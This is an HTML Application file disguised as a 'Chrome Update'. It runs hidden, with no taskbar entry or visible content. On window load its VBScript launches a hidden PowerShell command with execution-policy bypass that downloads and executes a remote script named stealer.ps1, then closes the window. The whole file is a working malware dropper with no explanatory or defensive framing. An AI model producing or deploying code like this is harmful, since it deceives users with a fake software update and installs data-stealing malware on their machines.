<html>
<head>
<HTA:APPLICATION ID="ChromeUpdater" 
    APPLICATIONNAME="Chrome Update" 
    BORDER="none"
    BORDERSTYLE="normal"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"/>
<script language="VBScript">
    Function ExecutePayload()
        Dim psCmd
        psCmd = "powershell -nop -w hidden -exec bypass -c ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; "
        psCmd = psCmd & "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/yourrepo/stealer.ps1')"""
        
        CreateObject("WScript.Shell").Run psCmd, 0, False
        window.close()
    End Function
    
    Sub Window_OnLoad
        ExecutePayload
    End Sub
</script>
</head>
<body>
<!-- No visible content -->
</body>
</html>
